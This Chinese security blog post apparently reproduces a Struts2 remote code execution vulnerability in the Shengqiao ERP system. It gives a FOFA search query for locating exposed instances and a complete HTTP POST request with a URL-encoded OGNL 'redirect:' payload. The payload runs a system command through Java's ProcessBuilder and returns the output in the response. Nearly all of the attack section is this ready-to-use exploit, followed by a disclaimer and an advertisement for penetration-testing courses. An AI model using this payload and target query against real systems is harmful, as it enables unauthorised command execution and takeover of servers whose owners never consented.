#  圣乔ERP系统 login.action Struts2远程代码执行漏洞复现   
原创 红岸基地赵小龙  暗影网安实验室   2024-11-26 09:00  
  
## 产品简介  
  
  
圣乔ERP系统是杭州圣乔科技有限公司开发的一款企业级管理软件，旨在为企业提供一套全面、集成化的管理解决方案，帮助企业实现资  
  
源的优化配置和高效利用。该系统集成了财务、人力资源、生产、销售、供应链等多个业务模块，实现了企业内外部信息的无缝连接和实  
  
时共享。适用于各种规模的企业，特别是需要实现资源优化配置、提高运营效率和管理水平的企业。它可以帮助企业解决传统管理方式中  
  
存在的信息孤岛、数据重复输入、信息传递滞后等问题，提高企业的整体竞争力  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqSvZE6x25icBxYJVFOCI9lDwlWBpRckT4lkZ0yxlUTib3XeuPtMmHFL5gWHDbCGsibT2ANGJPWqOCPA/640?wx_fmt=png&from=appmsg "")  
  
  
## 漏洞概述  
  
  
由于圣天ERP系统使用Struts2开发框架组件，存在历史Struts2远程代码执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系  
  
统命令，写入后门文件，获取服务器权限。  
## FOFA  
  
```
title="圣乔ERP系统"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqSvZE6x25icBxYJVFOCI9lDMvvN1HPFqF0icsCMgZjyIwuxiafmbrvujFrpzkYaJGEQ8oBH4ANECtDg/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
```
POST /erp/login.action HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
 
redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%27whoami%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqSvZE6x25icBxYJVFOCI9lDgicrKO9EJt7iclDxibDm4whCODpD1rad01BjBKXT0vQVWiaHe9SbbVWicAQ/640?wx_fmt=png&from=appmsg "")  
  
工具验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uqSvZE6x25icBxYJVFOCI9lDQNgicqxHibKbR7RFtB7vNu8YoJxX0OWzorWzAJTM0jaZJVO0DDgx0NRg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**免责声明**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
文章所涉及内容，仅供安全研究与教学之用，由于传播、利用本文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。  
  
  
大家对于网络安全感兴趣的话，不妨来加一下我们的老师，我们会定期在给大家分享  
**渗透****工具**和  
**实战****文****章**，还会有  
**渗透公开课**可以试听！  
  
**扫码添加，提升自己！**  
  
  
**👇👇👇**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/XvnzjMsl2uqSvZE6x25icBxYJVFOCI9lDasEWqq2rXaaHicvykJsBK94cBdfxibU6fOQ2iaTJ0IKoVMmiaFbIAjJz4A/640?wx_fmt=jpeg&from=appmsg "")  
  
后续一些打击犯罪文章会在下方公众号发布  
  
  
